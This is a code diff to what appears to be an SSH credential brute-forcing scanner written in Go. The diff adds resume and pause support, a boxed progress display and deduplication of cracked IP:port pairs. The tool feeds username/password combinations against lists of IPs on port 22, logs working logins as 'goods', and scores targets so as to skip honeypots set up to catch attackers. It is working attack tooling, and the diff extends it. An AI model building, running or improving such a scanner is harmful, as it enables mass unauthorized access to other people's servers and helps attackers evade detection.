-			fmt.Printf("⏳ Elapsed: %s\n", formatTime(elapsedTime))
-			fmt.Printf("⏰ Remaining: %s\n", formatTime(estimatedRemainingTime))
+			remainingStr := "calculating..."
+			if connectionsPerSecond > 0 {
+				remainingStr = formatTime(estimatedRemainingTime)
+			}
+			printBoxLine(fmt.Sprintf("⏳ Elapsed: %s | ⏰ ETA: %s", formatTime(elapsedTime), remainingStr), boxWidth)
 		} else {
-			fmt.Printf("⏳ Total Time: %s\n", formatTime(elapsedTime))
-			fmt.Printf("✅ Scan Completed Successfully!\n")
+			printBoxLine(fmt.Sprintf("⏳ Total Time: %s", formatTime(elapsedTime)), boxWidth)
+			printBoxLine("✅ Scan Completed Successfully!", boxWidth)
 		}
 		
-		fmt.Printf("================================================\n")
-		fmt.Printf("✅ Successful: %d\n", goods)
-		fmt.Printf("❌ Failed: %d\n", errors)
-		fmt.Printf("🍯 Honeypots: %d\n", honeypots)
+		// Separator
+		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+		
+		// Stats
+		printBoxLine(fmt.Sprintf("✅ Successful: %d | ❌ Failed: %d | 🍯 Honeypots: %d", goods, errors, honeypots), boxWidth)
 		
 		if totalConnections > 0 {
-			// Calculate rates based on successful connections (goods + honeypots)
 			successfulConnections := goods + honeypots
 			if successfulConnections > 0 {
-				fmt.Printf("📊 Success Rate: %.2f%%\n", float64(goods)/float64(successfulConnections)*100)
-				fmt.Printf("🍯 Honeypot Rate: %.2f%%\n", float64(honeypots)/float64(successfulConnections)*100)
+				printBoxLine(fmt.Sprintf("📊 Success Rate: %.1f%% | 🍯 Honeypot Rate: %.1f%%", 
+					float64(goods)/float64(successfulConnections)*100,
+					float64(honeypots)/float64(successfulConnections)*100), boxWidth)
 			}
 		}
 		
-		fmt.Printf("================================================\n")
-		fmt.Printf("| 💻 Coded By SudoLite with ❤️  |\n")
-		fmt.Printf("| 🔥 Enhanced Multi-Layer Workers v%s 🔥 |\n", VERSION)
-		fmt.Printf("| 🛡️  No License Required 🛡️   |\n")
-		fmt.Printf("================================================\n")
+		// Separator
+		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+		printBoxLine("💡 Press Ctrl+C to pause and save progress", boxWidth)
+		
+		// Separator
+		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+		printBoxLine("💻 Developer: SudoLite | GitHub & Twitter: @sudolite", boxWidth)
+		
+		// Bottom border
+		fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
 
 		if totalConnections >= totalIPCount {
-			os.Exit(0)
+			return
 		}
 	}
+}
+
+// Print a line inside the box with proper padding
+func printBoxLine(content string, boxWidth int) {
+	// Calculate visible length (accounting for emojis and wide chars)
+	visibleLen := getVisibleLength(content)
+	padding := boxWidth - visibleLen - 2 // -2 for leading space after ║
+	if padding < 0 {
+		padding = 0
+	}
+	fmt.Printf("║ %s%s ║\n", content, strings.Repeat(" ", padding))
+}
+
+// Get visible length of string - more accurate emoji detection
+func getVisibleLength(s string) int {
+	length := 0
+	runes := []rune(s)
+	for i := 0; i < len(runes); i++ {
+		r := runes[i]
+		// Emoji ranges (most common ones used in the app)
+		if (r >= 0x1F300 && r <= 0x1F9FF) || // Misc Symbols, Emoticons, etc
+		   (r >= 0x2600 && r <= 0x26FF) ||   // Misc Symbols
+		   (r >= 0x2700 && r <= 0x27BF) ||   // Dingbats
+		   (r >= 0x1F600 && r <= 0x1F64F) || // Emoticons
+		   (r >= 0x1F680 && r <= 0x1F6FF) || // Transport/Map symbols
+		   r == 0x231A || r == 0x231B ||     // Watch, Hourglass
+		   r == 0x23F0 || r == 0x23F3 ||     // Alarm clock, Hourglass
+		   r == 0x2705 || r == 0x274C ||     // Check, X mark
+		   r == 0xFE0F {                      // Variation selector
+			length += 2
+		} else if r > 127 {
+			// Other non-ASCII (like ═, ║, •, etc)
+			length += 1
+		} else {
+			length += 1
+		}
+	}
+	return length
+}
+
+// Truncate string to max length
+func truncateString(s string, maxLen int) string {
+	if len(s) <= maxLen {
+		return s
+	}
+	return s[:maxLen-3] + "..."
+}
+
+// Pad string to left
+func padLeft(s string, length int) string {
+	if len(s) >= length {
+		return s
+	}
+	return strings.Repeat(" ", length-len(s)) + s
 }
 
 func formatTime(seconds float64) string {
@@ -721,8 +1507,8 @@ func calculateOptimalBuffers() int {
 	return taskBuffer
 }
 
-// Enhanced worker pool system
-func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
+// Enhanced worker pool system with resume support
+func setupEnhancedWorkerPoolWithResume(combos [][]string, ips [][]string, resumeFrom int64) {
 	// Calculate optimal buffer sizes using enhanced algorithm
 	taskBufferSize := calculateOptimalBuffers()
 	
@@ -734,23 +1520,50 @@ func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
 	// Start main workers
 	for i := 0; i < maxConnections; i++ {
 		wg.Add(1)
-		go enhancedMainWorker(i, taskQueue, &wg)
+		go enhancedMainWorkerWithPause(i, taskQueue, &wg)
 	}
 	
 	// Start progress banner
 	go banner()
 	
-	// Generate and send tasks
+	// Generate and send tasks with resume support
 	go func() {
+		taskIdx := int64(0)
 		for _, combo := range combos {
 			for _, ip := range ips {
+				// Skip tasks before resume point
+				if taskIdx < resumeFrom {
+					taskIdx++
+					continue
+				}
+
+				// Check for pause signal
+				if IsPaused() {
+					close(taskQueue)
+					return
+				}
+
+				// Handle IP with or without port
+				ipAddr := ip[0]
+				port := "22"
+				if len(ip) > 1 && ip[1] != "" {
+					port = ip[1]
+				}
+
 				task := SSHTask{
-					IP:       ip[0],
-					Port:     ip[1],
+					IP:       ipAddr,
+					Port:     port,
 					Username: combo[0],
 					Password: combo[1],
 				}
+
+				atomic.StoreInt64(&currentTaskIndex, taskIdx)
 				taskQueue <- task
+				taskIdx++
+			}
+			if IsPaused() {
+				close(taskQueue)
+				return
 			}
 		}
 		close(taskQueue)
@@ -760,8 +1573,13 @@ func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
 	wg.Wait()
 }
 
-// Enhanced main worker with concurrent processing per worker
-func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
+// Legacy function for compatibility
+func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
+	setupEnhancedWorkerPoolWithResume(combos, ips, 0)
+}
+
+// Enhanced main worker with pause support
+func enhancedMainWorkerWithPause(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
 	defer wg.Done()
 	
 	// Semaphore to limit concurrent connections per worker
@@ -769,6 +1587,11 @@ func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGro
 	var workerWg sync.WaitGroup
 	
 	for task := range taskQueue {
+		// Check pause before starting new task
+		if IsPaused() {
+			break
+		}
+
 		workerWg.Add(1)
 		semaphore <- struct{}{} // Acquire semaphore
 		
@@ -781,6 +1604,11 @@ func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGro
 	}
 	
 	workerWg.Wait() // Wait for all concurrent tasks to complete
+}
+
+// Legacy function for compatibility  
+func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
+	enhancedMainWorkerWithPause(workerID, taskQueue, wg)
 }
 
 // Process individual SSH task
@@ -799,6 +1627,17 @@ func processSSHTask(task SSHTask) {
 	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
 	if err == nil {
 		defer client.Close()
+		
+		// Check if this IP:port combination has already been processed
+		successKey := fmt.Sprintf("%s:%s", task.IP, task.Port)
+		mapMutex.Lock()
+		if _, exists := successfulIPs[successKey]; exists {
+			mapMutex.Unlock()
+			return // Skip this IP:port since it's already been processed
+		}
+		// Mark as processed immediately to prevent other workers from processing it
+		successfulIPs[successKey] = struct{}{}
+		mapMutex.Unlock()
 		
 		// Create server information
 		serverInfo := &ServerInfo{
@@ -823,21 +1662,15 @@ func processSSHTask(task SSHTask) {
 		// Run full honeypot detection (all 9 algorithms) with valid client
 		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
 		
-		// Record result (same logic as original)
-		successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
-		mapMutex.Lock()
-		defer mapMutex.Unlock()
-		if _, exists := successfulIPs[successKey]; !exists {
-			successfulIPs[successKey] = struct{}{}
-			if !serverInfo.IsHoneypot {
-				atomic.AddInt64(&stats.goods, 1)
-				logSuccessfulConnection(serverInfo)
-			} else {
-				atomic.AddInt64(&stats.honeypots, 1)
-				log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
-				appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
-					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
-			}
+		// Record result based on honeypot detection
+		if !serverInfo.IsHoneypot {
+			atomic.AddInt64(&stats.goods, 1)
+			logSuccessfulConnection(serverInfo)
+		} else {
+			atomic.AddInt64(&stats.honeypots, 1)
+			log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
+			appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
+				serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
 		}
 	} else {
 		// Same error handling as original
